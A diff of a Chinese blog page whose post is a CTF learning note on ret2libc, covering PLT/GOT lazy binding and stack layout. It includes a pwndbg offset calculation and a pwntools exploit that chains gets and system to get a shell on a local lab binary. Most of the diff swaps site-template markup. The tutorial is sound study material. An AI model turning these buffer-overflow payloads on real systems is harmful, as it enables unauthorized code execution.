@@ -1,153 +1,160 @@
-
-
-
-
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta name="referrer" content="no-referrer"/>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#FFF">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-
-<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
-  <meta http-equiv="Cache-Control" content="no-transform">
-  <meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
-<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
-<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
-
-<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
-
-<link rel="stylesheet" href="/css/app.css?v=0.2.5">
-
-  
-  <meta name="keywords" content="Pwn" />
-
-
-<link rel="canonical" href="http://blog.g01den.top/posts/52965aaa.html">
-
-
-
-  <title>
-pwn学习笔记（4）ret2libc - Pwn手的自我修养 |
-golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
-<meta name="generator" content="Hexo 7.2.0"></head>
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div id="loading">
-    <div class="cat">
-      <div class="body"></div>
-      <div class="head">
-        <div class="face"></div>
-      </div>
-      <div class="foot">
-        <div class="tummy-end"></div>
-        <div class="bottom"></div>
-        <div class="legs left"></div>
-        <div class="legs right"></div>
-      </div>
-      <div class="paw">
-        <div class="hands left"></div>
-        <div class="hands right"></div>
-      </div>
-    </div>
-  </div>
-  <div id="container">
-    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="inner">
-        <div id="brand">
-          <div class="pjax">
-          
-  <h1 itemprop="name headline">pwn学习笔记（4）ret2libc
-  </h1>
-  
-<div class="meta">
-  <span class="item" title="创建时间：2024-02-19 18:10:34">
-    <span class="icon">
-      <i class="ic i-calendar"></i>
-    </span>
-    <span class="text">发表于</span>
-    <time itemprop="dateCreated datePublished" datetime="2024-02-19T18:10:34+08:00">2024-02-19</time>
-  </span>
-</div>
-
-
-          </div>
-        </div>
-        <nav id="nav">
-  <div class="inner">
-    <div class="toggle">
-      <div class="lines" aria-label="切换导航栏">
-        <span class="line"></span>
-        <span class="line"></span>
-        <span class="line"></span>
-      </div>
-    </div>
-    <ul class="menu">
-      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
-    </ul>
-    <ul class="right">
-      <li class="item theme">
-        <i class="ic i-sun"></i>
-      </li>
-      <li class="item search">
-        <i class="ic i-search"></i>
-      </li>
-    </ul>
-  </div>
-</nav>
-
-      </div>
-      <div id="imgs" class="pjax">
-          <img src="https://gitee.com/gou-dengyue/images/raw/master/picture131.png">
-      </div>
-    </header>
-    <div id="waves">
-      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
-        <defs>
-          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
-        </defs>
-        <g class="parallax">
-          <use xlink:href="#gentle-wave" x="48" y="0" />
-          <use xlink:href="#gentle-wave" x="48" y="3" />
-          <use xlink:href="#gentle-wave" x="48" y="5" />
-          <use xlink:href="#gentle-wave" x="48" y="7" />
-        </g>
-      </svg>
-    </div>
-    <main>
-      <div class="inner">
-        <div id="main" class="pjax">
-          
-  <div class="article wrap">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn学习笔记（4）ret2libc | golden的部落阁</title><meta name="author" content="g01den"><meta name="copyright" content="g01den"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="# pwn 学习笔记（4） # 静态链接： ​	静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成）链接到一块生成可执行程序。这里的库指的是静态链接库，Windows 下以.lib 为后缀，Linux 下以.a 为后缀。 ​	也就是说将静态链接库中的所有的函数都写入这个 ELF 文件中，所以会造成该二进制文件极为庞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn学习笔记（4）ret2libc">
+<meta property="og:url" content="http://blog.g01den.top/posts/52965aaa.html">
+<meta property="og:site_name" content="golden的部落阁">
+<meta property="og:description" content="# pwn 学习笔记（4） # 静态链接： ​	静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成）链接到一块生成可执行程序。这里的库指的是静态链接库，Windows 下以.lib 为后缀，Linux 下以.a 为后缀。 ​	也就是说将静态链接库中的所有的函数都写入这个 ELF 文件中，所以会造成该二进制文件极为庞">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/gou-dengyue/images/raw/master/picture131.png">
+<meta property="article:published_time" content="2024-02-19T10:10:34.000Z">
+<meta property="article:modified_time" content="2024-06-20T13:28:39.872Z">
+<meta property="article:author" content="g01den">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/gou-dengyue/images/raw/master/picture131.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://blog.g01den.top/posts/52965aaa.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pwn学习笔记（4）ret2libc',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-20 21:28:39'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
     
-<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
-<i class="ic i-home"></i>
-<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
-<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Pwn/" itemprop="item" rel="index" title="分类于 Pwn手的自我修养"><span itemprop="name">Pwn手的自我修养</span></a>
-<meta itemprop="position" content="1" /></span>
-</div>
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
-  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/52965aaa.html">
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
 
-  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="image" content="/images/avatar.jpg">
-    <meta itemprop="name" content="g01den">
-    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
-  </span>
-
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="golden的部落阁">
-  </span>
-
-  <div class="body md" itemprop="articleBody">
+        document.head.appendChild(script)
+      })
     
-
-    <h1 id="pwn学习笔记4"><a class="markdownIt-Anchor" href="#pwn学习笔记4">#</a> pwn 学习笔记（4）</h1>
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"><link rel="alternate" href="/atom.xml" title="golden的部落阁" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://thirdqq.qlogo.cn/headimg_dl?dst_uin=2082045221&amp;spec=640&amp;img_type=jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 我的朋友们</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://gitee.com/gou-dengyue/images/raw/master/picture131.png')"><nav id="nav"><span id="blog-info"><a href="/" title="golden的部落阁"><span class="site-name">golden的部落阁</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/bangumis/index.html"><i class="fa-fw fas fa-heart"></i><span> 追番</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 我的朋友们</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn学习笔记（4）ret2libc</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-19T10:10:34.000Z" title="发表于 2024-02-19 18:10:34">2024-02-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-20T13:28:39.872Z" title="更新于 2024-06-20 21:28:39">2024-06-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Pwn/">Pwn手的自我修养</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwn学习笔记（4）ret2libc"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="pwn学习笔记4"><a class="markdownIt-Anchor" href="#pwn学习笔记4">#</a> pwn 学习笔记（4）</h1>
 <h2 id="静态链接"><a class="markdownIt-Anchor" href="#静态链接">#</a> 静态链接：</h2>
 <p>​	静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成）链接到一块生成可执行程序。这里的库指的是静态链接库，Windows 下以.lib 为后缀，Linux 下以.a 为后缀。</p>
 <p>​	也就是说将静态链接库中的所有的函数都写入这个 ELF 文件中，所以会造成该二进制文件极为庞大，因此也会存在很多的可供利用来 ret2syscall 的 gadgets。但是，使用静态链接生成的可执行文件体积较大，包含相同的公共代码，造成浪费。</p>
@@ -169,7 +176,7 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
 <h3 id="2过程"><a class="markdownIt-Anchor" href="#2过程">#</a> 2. 过程：</h3>
 <h4 id="第一次调用以printf举例"><a class="markdownIt-Anchor" href="#第一次调用以printf举例">#</a> 第一次调用（以 printf () 举例）：</h4>
 <p>​	首先展示一下相关的代码:</p>
-<p><img data-src="https://img-blog.csdnimg.cn/direct/19d425d75963463a98ab32e69a30ebc2.png#pic_center" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/direct/19d425d75963463a98ab32e69a30ebc2.png#pic_center" alt="在这里插入图片描述"></p>
 <p>​	首先是在 text 段中执行了 call puts@plt，这个时候，程序执行流来到了 plt 段中的 puts 函数相关的代码，也就是 jmp *(puts@got)，再之后，程序执行流跳转到了.got.plt 段中的相关的地址，但是，因为进程是第一次调用的 puts 函数，因此，got 表中，puts 函数对应的地址为 puts@plt+1，因此回到了额 push index，回到 plt 表的目的是为了解析 puts 函数的实际地址，然后执行 jmp PLT0 ，跳转到 plt 头部，为 dl_runtime_resolve 函数传参，之后执行 PLT0 的两个结束后，也就是完成了传参后，dl_runtime_resolve 函数就会开始解析 puts 函数真正的地址，并填入 got.plt 表中，之后，got.plt 中保存的就是 puts 函数真正的地址，之后返回到 text 段的 call puts@plt 重新调用 puts 函数，跳转到 plt 表的 jmp *(puts@got) 代码，之后跳转到 got.plt 表，因为 got.plt 存放的就是 puts 函数的真实地址，所以，程序执行流就会调转到 puts 函数的真实地址以调用该函数。</p>
 <h4 id="第二次调用"><a class="markdownIt-Anchor" href="#第二次调用">#</a> 第二次调用：</h4>
 <p>​	程序执行流在 text 段执行了 call puts@plt，之后跳转到 plt 执行 jmp *(puts@got)，随后直接跳转到 got.plt 表中，紧接着跳转到 puts 函数所在的动态链接库中的真实地址。</p>
@@ -177,9 +184,9 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
 <p>​	某些情况，例如以如下程序为例：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>​	但程序执行到 system 函数的时候，原本此时的栈的当前位置为:</p>
-<p><img data-src="https://img-blog.csdnimg.cn/direct/02806003ea09499a905c8add6b087050.png#pic_center" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/direct/02806003ea09499a905c8add6b087050.png#pic_center" alt="在这里插入图片描述"></p>
 <p>​	也就是说，程序还没有执行到 call system 时（假设此时是以静态链接的 ELF 文件），栈的栈顶是如上图所示，但是，当 call system 代码执行时，将会将 ip 寄存器的值向下移一位的值压入栈中，然后跳转到 system 函数的第一行也就是 push bp，经过这两个操作后，栈的情况会如下图所示，对了，arg1 因为调用的是 system (&quot;/bin/sh&quot;) 的原因，arg1 存储的值会是 &quot;/bin/sh&quot; 的地址，如下图所示：</p>
-<p><img data-src="https://img-blog.csdnimg.cn/direct/5536f6e0104141ba84590bfafd442129.png#pic_center" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/direct/5536f6e0104141ba84590bfafd442129.png#pic_center" alt="在这里插入图片描述"></p>
 <p>​	因此，传参的时候，system 想要获取到 &quot;/bin/sh&quot; 的地址，就需要跳过 bp、return_addr 这两个字长，才能够获取到参数 &quot;/bin/sh&quot; 的地址。</p>
 <h2 id="ret2libc"><a class="markdownIt-Anchor" href="#ret2libc">#</a> ret2libc：</h2>
 <h3 id="1情况1"><a class="markdownIt-Anchor" href="#1情况1">#</a> 1. 情况 1：</h3>
@@ -220,9 +227,9 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
 <p>​	之后 gdb 动态调试获取需要的垃圾数据的长度：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 40</span><br><span class="line">00:0000│ esp 0xffffd300 —▸ 0xffffd31c ◂— <span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">01:0004│-084 0xffffd304 ◂— 0x0</span><br><span class="line">02:0008│-080 0xffffd308 ◂— 0x1</span><br><span class="line">03:000c│-07c 0xffffd30c ◂— 0x0</span><br><span class="line">04:0010│-078 0xffffd310 —▸ 0xf7ffdb9c —▸ 0xf7fc26f0 —▸ 0xf7ffda30 ◂— 0x0</span><br><span class="line">05:0014│-074 0xffffd314 ◂— 0x1</span><br><span class="line">06:0018│-070 0xffffd318 —▸ 0xf7fc2720 —▸ 0x8048354 ◂— inc edi /* <span class="string">&#x27;GLIBC_2.0&#x27;</span> */</span><br><span class="line">07:001c│ eax 0xffffd31c ◂— <span class="string">&#x27;AAAAAAAA&#x27;</span></span><br><span class="line">08:0020│-068 0xffffd320 ◂— <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">09:0024│-064 0xffffd324 ◂— 0x0</span><br><span class="line">0a:0028│-060 0xffffd328 —▸ 0xf7ffda30 ◂— 0x0</span><br><span class="line">0b:002c│-05c 0xffffd32c ◂— 0x1c</span><br><span class="line">0c:0030│-058 0xffffd330 ◂— 0xffffffff</span><br><span class="line">0d:0034│-054 0xffffd334 —▸ 0xf7fca67c ◂— 0xe</span><br><span class="line">0e:0038│-050 0xffffd338 —▸ 0xf7ffd5e8 (_rtld_global+1512) —▸ 0xf7fca000 ◂— 0x464c457f</span><br><span class="line">0f:003c│-04c 0xffffd33c —▸ 0xffffdfe2 ◂— <span class="string">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class="line">10:0040│-048 0xffffd340 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x32f34</span><br><span class="line">11:0044│-044 0xffffd344 ◂— 0xc /* <span class="string">&#x27;\x0c&#x27;</span> */</span><br><span class="line">12:0048│-040 0xffffd348 ◂— 0x0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">16:0058│-030 0xffffd358 ◂— 0x13</span><br><span class="line">17:005c│-02c 0xffffd35c —▸ 0xf7fc2400 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class="line">18:0060│-028 0xffffd360 —▸ 0xf7c216ac ◂— 0x21e04c</span><br><span class="line">19:0064│-024 0xffffd364 —▸ 0xf7fd9d41 (_dl_fixup+225) ◂— mov dword ptr [esp + 0x28], eax                                                                  </span><br><span class="line">1a:0068│-020 0xffffd368 —▸ 0xf7c1c9a2 ◂— <span class="string">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class="line">1b:006c│-01c 0xffffd36c —▸ 0xf7fc2400 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class="line">1c:0070│-018 0xffffd370 —▸ 0xffffd3a0 —▸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c</span><br><span class="line">1d:0074│-014 0xffffd374 —▸ 0xf7fc25d8 —▸ 0xf7ffdb9c —▸ 0xf7fc26f0 —▸ 0xf7ffda30 ◂— ...                                                                    </span><br><span class="line">1e:0078│-010 0xffffd378 —▸ 0xf7fc2ab0 —▸ 0xf7c1f22d ◂— <span class="string">&#x27;GLIBC_PRIVATE&#x27;</span></span><br><span class="line">1f:007c│-00c 0xffffd37c ◂— 0x1</span><br><span class="line">20:0080│-008 0xffffd380 ◂— 0x1</span><br><span class="line">21:0084│-004 0xffffd384 ◂— 0x0</span><br><span class="line">22:0088│ ebp 0xffffd388 ◂— 0x0</span><br><span class="line">23:008c│+004 0xffffd38c —▸ 0xf7c237c5 (__libc_start_call_main+117) ◂— add esp, 0x10                                                                       </span><br><span class="line">24:0090│+008 0xffffd390 ◂— 0x1</span><br><span class="line">25:0094│+00c 0xffffd394 —▸ 0xffffd444 —▸ 0xffffd5c2 ◂— <span class="string">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class="line">26:0098│+010 0xffffd398 —▸ 0xffffd44c —▸ 0xffffd5d8 ◂— <span class="string">&#x27;COLORTERM=truecolor&#x27;</span></span><br><span class="line">27:009c│+014 0xffffd39c —▸ 0xffffd3b0 —▸ 0xf7e1dff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21dd8c</span><br><span class="line">pwndbg&gt; 0x388 -0x31c</span><br><span class="line">Undefined <span class="built_in">command</span>: <span class="string">&quot;0x388&quot;</span>.  Try <span class="string">&quot;help&quot;</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> 0x388 -0x31c</span><br><span class="line"><span class="variable">$1</span> = 108</span><br></pre></td></tr></table></figure>
 <p>​	基本上需要的信息全部都有了，那么就可以进行代码的编写了，基本上思路按照下图所示：</p>
-<p><img data-src="https://img-blog.csdnimg.cn/direct/aa290048a01543e7bcb197d704071cd2.png#pic_center" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/direct/aa290048a01543e7bcb197d704071cd2.png#pic_center" alt="在这里插入图片描述"></p>
 <p>​	这里的思路是无论后续的程序是否崩溃，都跟我们没关系，所以没有平衡栈，平衡栈的写法如下图：</p>
-<p><img data-src="https://img-blog.csdnimg.cn/direct/cb466c0487d04ffeae39492abda43194.png#pic_center" alt="在这里插入图片描述"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/direct/cb466c0487d04ffeae39492abda43194.png#pic_center" alt="在这里插入图片描述"></p>
 <p>​	因此，最后的 exp 为（没有平衡栈）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x8048460</span><br><span class="line">sys_plt = 0x8048490</span><br><span class="line">buf2 = 0x0804A080</span><br><span class="line">payload = b&#x27;A&#x27;*112 + p32(gets_plt) + p32(sys_plt) + p32(buf2) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <h3 id="3情况3"><a class="markdownIt-Anchor" href="#3情况3">#</a> 3. 情况 3：</h3>
@@ -237,388 +244,69 @@ golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
 <p>​	可见，是 64 为小端序，开启了 NX 保护，之后静态调试看看，首先是 main，左边能找到，发现 main 里面调用了个函数，是以地址的形式，跟进这个函数：</p>
